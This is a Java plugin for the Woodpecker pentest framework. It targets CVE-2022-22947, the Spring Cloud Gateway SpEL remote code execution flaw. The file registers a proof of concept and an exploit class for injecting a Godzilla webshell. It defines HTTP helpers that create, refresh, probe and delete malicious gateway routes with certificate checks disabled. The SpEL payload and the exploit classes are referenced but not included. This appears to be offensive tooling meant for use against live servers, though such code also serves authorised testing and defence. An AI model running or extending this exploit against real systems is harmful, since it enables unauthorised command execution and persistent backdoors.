package plugins.vul.spring.cloud.gateway;

import me.gv7.woodpecker.plugin.IExploit;
import me.gv7.woodpecker.plugin.IPluginHelper;
import me.gv7.woodpecker.plugin.IVulPlugin;
import me.gv7.woodpecker.plugin.IVulPluginCallbacks;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;

import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

public class CVE_2022_22947_Plugin implements IVulPlugin {
    public static IVulPluginCallbacks vulPluginCallbacks;
    public static IPluginHelper pluginHelper;

    @Override
    public void VulPluginMain(IVulPluginCallbacks iVulPluginCallbacks) {
        vulPluginCallbacks = iVulPluginCallbacks;
        pluginHelper = vulPluginCallbacks.getPluginHelper();

        vulPluginCallbacks.setVulPluginName("spring cloud gateway spel rce");
        vulPluginCallbacks.setVulName("spring cloud gateway spel表达式远程命令执行");
        vulPluginCallbacks.setVulPluginAuthor("runt0");
        vulPluginCallbacks.setVulPluginVersion("0.0.1");
        vulPluginCallbacks.setVulProduct("spring cloud gateway");
        vulPluginCallbacks.setVulId("CVE-2022-22947");
        vulPluginCallbacks.setVulSeverity(IVulPluginCallbacks.VUL_CATEGORY_RCE);
        vulPluginCallbacks.registerPoc(new CVE_2022_22947_POC());
        vulPluginCallbacks.registerExploit(Collections.<IExploit>singletonList(new CVE_2022_22947_InjectGodzillaShell_Exploit()));
    }

    // 发送创建路由请求
    public static RawResponse createPocRoute(
            String baseUrl,
            String routeName,
            String payload){
        Map<String,String> headers = new HashMap();
        headers.put("Content-Type","application/json");
        RawResponse rawResponse = Requests.post(String.format("%s/routes/%s",baseUrl,routeName))
                .verify(false)
                .body(payload)
                .headers(headers)
                .send();
        return rawResponse;
    }

    // 发送刷新路由请求
    public static RawResponse refreshRoute(String url){
        RawResponse rawResponse = Requests.post(url)
                .verify(false)
                .send();
        return rawResponse;
    }

    // 探测路由是否存在
    public static RawResponse verifyRoute(String url){
        RawResponse rawResponse = Requests.get(url)
                .verify(false)
                .send();
        return rawResponse;
    }

    // 发送删除路由请求
    public static RawResponse deleteRoute(String url){
        RawResponse rawResponse = Requests.delete(url)
                .verify(false)
                .send();
        return rawResponse;
    }


}
